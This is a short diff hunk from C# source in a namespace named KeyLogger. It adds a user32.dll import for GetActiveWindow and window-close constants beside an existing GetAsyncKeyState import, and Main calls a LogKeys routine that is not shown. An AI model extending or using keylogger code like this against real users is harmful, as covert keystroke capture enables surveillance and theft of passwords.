@@ -15,6 +15,11 @@ namespace KeyLogger
     {
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
+        [DllImport("user32.dll")]
+        static extern IntPtr GetActiveWindow();
+        public const int WM_SYSCOMMAND = 0x0112;
+        public const int SC_CLOSE = 0xF060;
+
         static void Main(string[] args)
         {
             LogKeys();
